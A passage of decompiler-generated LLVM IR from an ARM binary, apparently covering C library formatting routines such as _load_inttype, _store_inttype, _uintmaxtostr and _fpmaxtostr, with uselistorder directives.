  %v2_2aac0 = phi i32 [ %v0_2aab4.pre, %.dec_label_pc_2aab4_crit_edge ], [ %v0_2aa84, %dec_label_pc_2aa7c ], [ %v0_2aa84, %dec_label_pc_2aa94 ]
  %v1_2aab4 = inttoptr i32 %v2_2aac0 to i16*
  %v2_2aab4 = load i16, i16* %v1_2aab4, align 2
  %v1_2aab8 = add i32 %v2_2aac0, 8
  %v2_2aab8 = inttoptr i32 %v1_2aab8 to i32*
  %v3_2aab8 = load i32, i32* %v2_2aab8, align 4
  store i32 %v3_2aab8, i32* %r2.global-to-local, align 4
  %v1_2aabc = and i16 %v2_2aab4, -4
  store i16 %v1_2aabc, i16* %v1_2aab4, align 2
  %v0_2aac4 = load i32, i32* %r2.global-to-local, align 4
  %v1_2aac4 = load i32, i32* @r4, align 4
  %v2_2aac4 = add i32 %v1_2aac4, 20
  %v3_2aac4 = inttoptr i32 %v2_2aac4 to i32*
  store i32 %v0_2aac4, i32* %v3_2aac4, align 4
  %v0_2aac8 = load i32, i32* %r2.global-to-local, align 4
  %v1_2aac8 = load i32, i32* @r4, align 4
  %v2_2aac8 = add i32 %v1_2aac8, 24
  %v3_2aac8 = inttoptr i32 %v2_2aac8 to i32*
  store i32 %v0_2aac8, i32* %v3_2aac8, align 4
  %v0_2aacc = load i32, i32* %r2.global-to-local, align 4
  %v1_2aacc = load i32, i32* @r4, align 4
  %v2_2aacc = add i32 %v1_2aacc, 16
  %v3_2aacc = inttoptr i32 %v2_2aacc to i32*
  store i32 %v0_2aacc, i32* %v3_2aacc, align 4
  %v0_2aad0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2aad0

dec_label_pc_2aad0:                               ; preds = %dec_label_pc_2aa74, %dec_label_pc_2aab4
  %v2_2aadc = phi i32 [ %v0_2aa84, %dec_label_pc_2aa74 ], [ %v0_2aad0.pre, %dec_label_pc_2aab4 ]
  %v1_2aad0 = inttoptr i32 %v2_2aadc to i16*
  %v2_2aad0 = load i16, i16* %v1_2aad0, align 2
  %v3_2aad0 = zext i16 %v2_2aad0 to i32
  %v1_2aad4 = or i16 %v2_2aad0, 64
  %v1_2aad8 = and i32 %v3_2aad0, 2816
  store i32 %v1_2aad8, i32* %r0.global-to-local, align 4
  %v2_2aad8 = icmp eq i32 %v1_2aad8, 0
  store i16 %v1_2aad4, i16* %v1_2aad0, align 2
  br i1 %v2_2aad8, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_2aad0
  %v1_2aae0 = load i32, i32* @r4, align 4
  %v2_2aae0 = add i32 %v1_2aae0, 12
  %v3_2aae0 = inttoptr i32 %v2_2aae0 to i32*
  %v4_2aae0 = load i32, i32* %v3_2aae0, align 4
  %v3_2aae4 = add i32 %v1_2aae0, 28
  %v4_2aae4 = inttoptr i32 %v3_2aae4 to i32*
  store i32 %v4_2aae0, i32* %v4_2aae4, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_2aad0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_2aa60, %.thread1
  %v2_2aaec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2aaec, i32* @r4, align 4
  %v1_2aaf0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2aaf0

; uselistorder directives
  uselistorder i32 %v2_2aac0, { 1, 0 }
  uselistorder i32 %v0_2aa84, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_2aa20, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2aad0, { 1, 0 }
  uselistorder label %dec_label_pc_2aab4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_2aa9c, { 1, 0 }
  uselistorder label %dec_label_pc_2aa4c, { 1, 0 }
  uselistorder label %dec_label_pc_2aa40, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_2aaf8 = load i32, i32* @r2, align 4
  %v1_2aaf8 = icmp slt i32 %v0_2aaf8, 0
  %v0_2aafc = load i32, i32* @r0, align 4
  %v1_2ab00 = and i32 %v0_2aafc, 2048
  %v2_2ab34 = icmp eq i32 %v1_2ab00, 0
  br i1 %v1_2aaf8, label %dec_label_pc_2ab34, label %dec_label_pc_2ab08

dec_label_pc_2ab08:                               ; preds = %entry
  br i1 %v2_2ab34, label %dec_label_pc_2ab10, label %dec_label_pc_2ab3c

dec_label_pc_2ab10:                               ; preds = %dec_label_pc_2ab08
  %v7_2ab10 = icmp eq i32 %v0_2aafc, 256
  %v0_2ab14 = load i32, i32* @r1, align 4
  %v1_2ab14 = inttoptr i32 %v0_2ab14 to i32*
  %v2_2ab14 = load i32, i32* %v1_2ab14, align 4
  %v2_2ab18 = urem i32 %v2_2ab14, 256
  %v2_2ab18.v2_2ab14 = select i1 %v7_2ab10, i32 %v2_2ab18, i32 %v2_2ab14
  br i1 %v7_2ab10, label %.thread, label %dec_label_pc_2ab20

dec_label_pc_2ab20:                               ; preds = %dec_label_pc_2ab10
  %v7_2ab20 = icmp eq i32 %v0_2aafc, 512
  br i1 %v7_2ab20, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_2ab20
  %v4_2ab28 = urem i32 %v2_2ab18.v2_2ab14, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_2ab20, %dec_label_pc_2ab10, %bb
  %v1_2ab30 = phi i32 [ %v2_2ab14, %dec_label_pc_2ab20 ], [ %v2_2ab18, %dec_label_pc_2ab10 ], [ %v4_2ab28, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_2ab30

dec_label_pc_2ab34:                               ; preds = %entry
  br i1 %v2_2ab34, label %dec_label_pc_2ab44, label %dec_label_pc_2ab3c

dec_label_pc_2ab3c:                               ; preds = %dec_label_pc_2ab08, %dec_label_pc_2ab34
  %v0_2ab3c = load i32, i32* @r1, align 4
  %v1_2ab3c = inttoptr i32 %v0_2ab3c to i32*
  %v2_2ab3c = load i32, i32* %v1_2ab3c, align 4
  %v3_2ab3c = add i32 %v0_2ab3c, 4
  %v4_2ab3c = inttoptr i32 %v3_2ab3c to i32*
  %v5_2ab3c = load i32, i32* %v4_2ab3c, align 4
  store i32 %v5_2ab3c, i32* @r1, align 4
  ret i32 %v2_2ab3c

dec_label_pc_2ab44:                               ; preds = %dec_label_pc_2ab34
  %v7_2ab44 = icmp eq i32 %v0_2aafc, 256
  %v0_2ab48 = load i32, i32* @r1, align 4
  %v1_2ab48 = inttoptr i32 %v0_2ab48 to i32*
  %v2_2ab48 = load i32, i32* %v1_2ab48, align 4
  br i1 %v7_2ab44, label %.thread1, label %dec_label_pc_2ab58

.thread1:                                         ; preds = %dec_label_pc_2ab44
  %v4_2ab4c = mul i32 %v2_2ab48, 16777216
  %v4_2ab50 = sdiv i32 %v4_2ab4c, 16777216
  br label %.thread3

dec_label_pc_2ab58:                               ; preds = %dec_label_pc_2ab44
  %v7_2ab58 = icmp eq i32 %v0_2aafc, 512
  br i1 %v7_2ab58, label %bb9, label %.thread3

bb9:                                              ; preds = %dec_label_pc_2ab58
  %v4_2ab5c = mul i32 %v2_2ab48, 65536
  %v4_2ab60 = sdiv i32 %v4_2ab5c, 65536
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %dec_label_pc_2ab58, %bb9
  %v0_2ab64 = phi i32 [ %v2_2ab48, %dec_label_pc_2ab58 ], [ %v4_2ab50, %.thread1 ], [ %v4_2ab60, %bb9 ]
  %v3_2ab64 = ashr i32 %v0_2ab64, 31
  store i32 %v3_2ab64, i32* @r1, align 4
  ret i32 %v0_2ab64

; uselistorder directives
  uselistorder i32 %v0_2ab64, { 1, 0 }
  uselistorder i32 %v2_2ab48, { 2, 0, 1 }
  uselistorder i32 %v2_2ab18, { 1, 0 }
  uselistorder i32 %v2_2ab14, { 1, 2, 0 }
  uselistorder i1 %v2_2ab34, { 1, 0 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2ab3c, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_2ab6c = icmp eq i32 %arg2, 256
  store i1 %v7_2ab6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2ab6c, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_2ab70 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_2ab70, i8* %tmp3, align 1
  %v1_2ab74.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_2ab74 = phi i1 [ false, %entry ], [ %v1_2ab74.pre, %bb ]
  %v0_2ab74 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_2ab74, i32 %v0_2ab74)
  %v7_2ab78 = icmp eq i32 %arg2, 2048
  store i1 %v7_2ab78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2ab78, label %dec_label_pc_2ab80, label %dec_label_pc_2ab88

dec_label_pc_2ab80:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_2ab80 = add i32 %tmp2, 4
  %v6_2ab80 = inttoptr i32 %v5_2ab80 to i32*
  store i32 %arg4, i32* %v6_2ab80, align 4
  ret i32 %tmp2

dec_label_pc_2ab88:                               ; preds = %bb4
  %v7_2ab88 = icmp eq i32 %arg2, 512
  store i1 %v7_2ab88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2ab88, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_2ab88
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_2ab88
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_2aba4 = icmp slt i32 %tmp21, 0
  %v2_2aba4 = icmp eq i32 %tmp21, 0
  store i1 %v2_2aba4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_2abac = load i32, i32* @r2, align 4
  store i32 %v0_2abac, i32* %r5.global-to-local, align 4
  %v0_2abb0 = load i32, i32* @r3, align 4
  store i32 %v0_2abb0, i32* %r6.global-to-local, align 4
  br i1 %v1_2aba4, label %dec_label_pc_2abb8, label %dec_label_pc_2abd8

dec_label_pc_2abb8:                               ; preds = %entry
  %v1_2abb8 = icmp slt i32 %v0_2abb0, 0
  %v2_2abb8 = icmp eq i32 %v0_2abb0, 0
  store i1 %v2_2abb8, i1* %cpsr_z.global-to-local, align 1
  %v1_2abbc = sub i32 0, %tmp21
  store i32 %v1_2abbc, i32* %r7.global-to-local, align 4
  br i1 %v1_2abb8, label %dec_label_pc_2abc4, label %dec_label_pc_2abd8

dec_label_pc_2abc4:                               ; preds = %dec_label_pc_2abb8
  %v1_2abc8 = sub i32 0, %v0_2abac
  store i32 %v1_2abc8, i32* %r5.global-to-local, align 4
  %v2_2abc8 = icmp eq i32 %v0_2abac, 0
  %v2_2abcc = icmp eq i1 %v2_2abc8, false
  %v5_2abcc = sext i1 %v2_2abcc to i32
  %v6_2abcc = sub i32 %v5_2abcc, %v0_2abb0
  store i32 %v6_2abcc, i32* %r6.global-to-local, align 4
  %v19_2abcc = icmp eq i32 %v6_2abcc, 0
  store i1 %v19_2abcc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2abe0

dec_label_pc_2abd8:                               ; preds = %dec_label_pc_2abb8, %entry
  br label %dec_label_pc_2abe0

dec_label_pc_2abe0:                               ; preds = %dec_label_pc_2abc4, %dec_label_pc_2abd8
  %storemerge = phi i8 [ 0, %dec_label_pc_2abd8 ], [ 1, %dec_label_pc_2abc4 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_2abe8 = load i32, i32* %r7.global-to-local, align 4
  %v2_2abf0 = udiv i32 -1, %v0_2abe8
  store i32 %v2_2abf0, i32* %fp.global-to-local, align 4
  %v3_2ac00 = urem i32 -1, %v0_2abe8
  %v1_2ac04 = add i32 %v3_2ac00, 1
  store i32 %v1_2ac04, i32* %sb.global-to-local, align 4
  %v9_2ac08 = icmp eq i32 %v1_2ac04, %v0_2abe8
  store i1 %v9_2ac08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2ac08, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_2abe0
  %v1_2ac0c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_2ac0c, i32* %sb.global-to-local, align 4
  %v2_2ac10 = add i32 %v2_2abf0, 1
  store i32 %v2_2ac10, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_2abe0, %bb
  %v0_2ac14 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2ac14, i32* %sl.global-to-local, align 4
  %v0_2ac18 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2ac18, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2ac1c

dec_label_pc_2ac1cthread-pre-split:               ; preds = %bb25
  %v0_2ac1c.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_2ac20.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_2ac24.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2ac1c

dec_label_pc_2ac1c:                               ; preds = %dec_label_pc_2ac1cthread-pre-split, %.thread
  %v0_2aca0 = phi i32 [ %v0_2ac24.pre, %dec_label_pc_2ac1cthread-pre-split ], [ %v0_2abe8, %.thread ]
  %v0_2ac98 = phi i32 [ %v0_2ac20.pre, %dec_label_pc_2ac1cthread-pre-split ], [ %v0_2ac18, %.thread ]
  %v0_2ac34 = phi i32 [ %v0_2ac1c.pr, %dec_label_pc_2ac1cthread-pre-split ], [ %v0_2ac14, %.thread ]
  %v2_2ac1c = icmp eq i32 %v0_2ac34, 0
  store i1 %v2_2ac1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2ac1c, label %dec_label_pc_2ac94, label %dec_label_pc_2ac2c

dec_label_pc_2ac2c:                               ; preds = %dec_label_pc_2ac1c
  %v2_2ac30 = udiv i32 %v0_2ac34, %v0_2aca0
  %v3_2ac30 = urem i32 %v0_2ac34, %v0_2aca0
  store i32 %v2_2ac30, i32* %sl.global-to-local, align 4
  %v2_2ac50 = udiv i32 %v0_2ac98, %v0_2aca0
  %v3_2ac50 = urem i32 %v0_2ac98, %v0_2aca0
  %v0_2ac54 = load i32, i32* %sb.global-to-local, align 4
  %v2_2ac54 = mul i32 %v0_2ac54, %v3_2ac30
  %v2_2ac5c = add i32 %v2_2ac54, %v3_2ac50
  store i32 %v2_2ac5c, i32* %r5.global-to-local, align 4
  %v0_2ac68 = load i32, i32* %fp.global-to-local, align 4
  %v2_2ac68 = mul i32 %v0_2ac68, %v3_2ac30
  %v2_2ac70 = add i32 %v2_2ac68, %v2_2ac50
  %v2_2ac78 = udiv i32 %v2_2ac5c, %v0_2aca0
  %v2_2ac80 = add i32 %v2_2ac70, %v2_2ac78
  br label %dec_label_pc_2acac

dec_label_pc_2ac94:                               ; preds = %dec_label_pc_2ac1c
  %v2_2ac94 = udiv i32 %v0_2ac98, %v0_2aca0
  br label %dec_label_pc_2acac

dec_label_pc_2acac:                               ; preds = %dec_label_pc_2ac2c, %dec_label_pc_2ac94
  %storemerge28 = phi i32 [ %v2_2ac94, %dec_label_pc_2ac94 ], [ %v2_2ac80, %dec_label_pc_2ac2c ]
  %v0_2acc8 = phi i32 [ %v2_2ac94, %dec_label_pc_2ac94 ], [ %v2_2ac80, %dec_label_pc_2ac2c ]
  %v1_2acc8 = phi i32 [ 0, %dec_label_pc_2ac94 ], [ %v2_2ac30, %dec_label_pc_2ac2c ]
  %v2_2ac5c.pn = phi i32 [ %v0_2ac98, %dec_label_pc_2ac94 ], [ %v2_2ac5c, %dec_label_pc_2ac2c ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_2acb4 = urem i32 %v2_2ac5c.pn, %v0_2aca0
  %v2_2acb0 = icmp ugt i32 %v0_2acb4, 8
  %v7_2acb0 = icmp eq i32 %v0_2acb4, 9
  store i1 %v7_2acb0, i1* %cpsr_z.global-to-local, align 1
  %v1_2acb8 = add i32 %v0_2acb4, 48
  %v0_2acc0 = load i32, i32* %r8.global-to-local, align 4
  %v1_2acc0 = add i32 %v0_2acc0, -1
  store i32 %v1_2acc0, i32* %r8.global-to-local, align 4
  %v2_2acc4 = xor i1 %v7_2acb0, true
  %v3_2acc4 = and i1 %v2_2acb0, %v2_2acc4
  %extract.t = trunc i32 %v1_2acb8 to i8
  br i1 %v3_2acc4, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_2acac
  %v2_2acb4 = add i32 %v0_2acb4, %tmp11
  %extract.t9 = trunc i32 %v2_2acb4 to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_2acac, %bb24
  %v0_2accc.off0 = phi i8 [ %extract.t, %dec_label_pc_2acac ], [ %extract.t9, %bb24 ]
  %v2_2acc8 = or i32 %v0_2acc8, %v1_2acc8
  %v4_2acc8 = icmp eq i32 %v2_2acc8, 0
  store i1 %v4_2acc8, i1* %cpsr_z.global-to-local, align 1
  %v3_2accc = inttoptr i32 %v1_2acc0 to i8*
  store i8 %v0_2accc.off0, i8* %v3_2accc, align 1
  %v0_2acd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2acd0, label %dec_label_pc_2acd4, label %dec_label_pc_2ac1cthread-pre-split

dec_label_pc_2acd4:                               ; preds = %bb25
  %v4_2acd410 = zext i8 %storemerge to i32
  store i32 %v4_2acd410, i32* @r3, align 4
  %v2_2acd8 = icmp eq i8 %storemerge, 0
  store i1 %v2_2acd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2acd8, label %dec_label_pc_2acd4..thread2_crit_edge, label %bb26

dec_label_pc_2acd4..thread2_crit_edge:            ; preds = %dec_label_pc_2acd4
  %v0_2ace4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_2acd4
  store i32 45, i32* @r3, align 4
  %v3_2ace0 = load i32, i32* %r8.global-to-local, align 4
  %v4_2ace0 = add i32 %v3_2ace0, -1
  %v5_2ace0 = inttoptr i32 %v4_2ace0 to i8*
  store i8 45, i8* %v5_2ace0, align 1
  %v6_2ace0 = load i32, i32* %r8.global-to-local, align 4
  %v7_2ace0 = add i32 %v6_2ace0, -1
  store i32 %v7_2ace0, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2acd4..thread2_crit_edge, %bb26
  %v0_2ace4 = phi i32 [ %v0_2ace4.pre, %dec_label_pc_2acd4..thread2_crit_edge ], [ %v7_2ace0, %bb26 ]
  ret i32 %v0_2ace4

; uselistorder directives
  uselistorder i32 %v0_2acb4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_2aca0, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_2abac, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_2acac, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_2abe0, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_2acf4 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_2ad00 = add i32 %arg4, 8
  %v2_2ad00 = inttoptr i32 %v1_2ad00 to i8*
  %v3_2ad00 = load i8, i8* %v2_2ad00, align 1
  %v4_2ad00 = zext i8 %v3_2ad00 to i32
  store i32 %v4_2ad00, i32* %sb.global-to-local, align 4
  %v1_2ad04 = or i32 %v4_2ad00, 32
  %v7_2ad08 = icmp eq i32 %v1_2ad04, 97
  store i1 %v7_2ad08, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_2ad20 = inttoptr i32 %arg4 to i32*
  %v2_2ad20 = load i32, i32* %v1_2ad20, align 4
  store i32 %v2_2ad20, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_2ad28 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_2ad28, i32* %r6.global-to-local, align 4
  store i32 97148, i32* %ip.global-to-local, align 4
  br i1 %v7_2ad08, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_2ad30 = add nuw nsw i32 %v4_2ad00, 6
  store i32 %v2_2ad30, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_2ad40 = phi i32 [ %v0_2ad28, %entry ], [ %v2_2ad30, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_2ad38 = add i32 %arg4, 12
  %v2_2ad38 = inttoptr i32 %v1_2ad38 to i32*
  %v3_2ad38 = load i32, i32* %v2_2ad38, align 4
  store i32 %v3_2ad38, i32* %r2.global-to-local, align 4
  %v1_2ad3c = add i32 %arg4, 4
  %v2_2ad3c = inttoptr i32 %v1_2ad3c to i32*
  %v3_2ad3c = load i32, i32* %v2_2ad3c, align 4
  store i32 %v3_2ad3c, i32* @lr, align 4
  br i1 %v7_2ad08, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_2ad40 = urem i32 %v1_2ad40, 256
  store i32 %v2_2ad40, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_2ad44 = icmp slt i32 %v2_2ad20, 0
  %v2_2ad44 = icmp eq i32 %v2_2ad20, 0
  store i1 %v2_2ad44, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_2ad44, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_2ad54 = and i32 %v3_2ad38, 2
  %v2_2ad54 = icmp eq i32 %v1_2ad54, 0
  store i1 %v2_2ad54, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_2ad54, label %dec_label_pc_2ad6c, label %dec_label_pc_2ad78

dec_label_pc_2ad6c:                               ; preds = %bb205
  %v1_2ad6c = urem i32 %v3_2ad38, 2
  %v2_2ad6c = icmp eq i32 %v1_2ad6c, 0
  store i1 %v2_2ad6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2ad6c, label %dec_label_pc_2ad7c, label %dec_label_pc_2ad78

dec_label_pc_2ad78:                               ; preds = %dec_label_pc_2ad6c, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_2ad6c ]
  %v0_2ad78.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_2ad6c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_2ad78.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_2ad7c

dec_label_pc_2ad7c:                               ; preds = %dec_label_pc_2ad6c, %dec_label_pc_2ad78
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_2ad28, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_2ad28, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_2ad98 = fptrunc double %arg2 to float
  %v2_2ad98 = bitcast float %v1_2ad98 to i32
  %v9_2ad98 = call i32 @__aeabi_dcmpeq(i32 %v2_2ad98, i32 %v0_2ad28, i32 %v2_2ad98, i32 %v0_2ad28, i32 0)
  store i32 %v9_2ad98, i32* %r0.global-to-local, align 4
  %v2_2ad9c = icmp eq i32 %v9_2ad98, 0
  store i1 %v2_2ad9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2ad9c, label %bb207, label %dec_label_pc_2adac

bb207:                                            ; preds = %dec_label_pc_2ad7c
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2ae60

dec_label_pc_2adac:                               ; preds = %dec_label_pc_2ad7c
  %v0_2adac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2adac, i32* @r0, align 4
  %v0_2adb0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2adb0, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_2adbc = call i32 @__aeabi_dcmpeq(i32 %v0_2adac, i32 %v0_2adb0, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_2adbc, i32* %r0.global-to-local, align 4
  %v2_2adc0 = icmp eq i32 %v7_2adbc, 0
  store i1 %v2_2adc0, i1* %cpsr_z.global-to-local, align 1
  %v0_2ae08 = load i32, i32* %r5.global-to-local, align 4
  %v1_2ae08 = sext i32 %v0_2ae08 to i64
  %v2_2ae08 = bitcast i64 %v1_2ae08 to double
  br i1 %v2_2adc0, label %dec_label_pc_2ae08, label %dec_label_pc_2adc8

dec_label_pc_2adc8:                               ; preds = %dec_label_pc_2adac
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_2add8 = fdiv double 0.000000e+00, %v2_2ae08
  %v10_2add8 = fptrunc double %v9_2add8 to float
  %v11_2add8 = bitcast float %v10_2add8 to i32
  store i32 %v11_2add8, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_2ade4 = call i32 @__aeabi_dcmplt(i32 %v11_2add8, i32 1072693248, i32 0, i32 0)
  store i32 %v4_2ade4, i32* %r0.global-to-local, align 4
  %v2_2ade8 = icmp eq i32 %v4_2ade4, 0
  store i1 %v2_2ade8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2ade8, label %bb208, label %dec_label_pc_2adf4

bb208:                                            ; preds = %dec_label_pc_2adc8
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2afd4

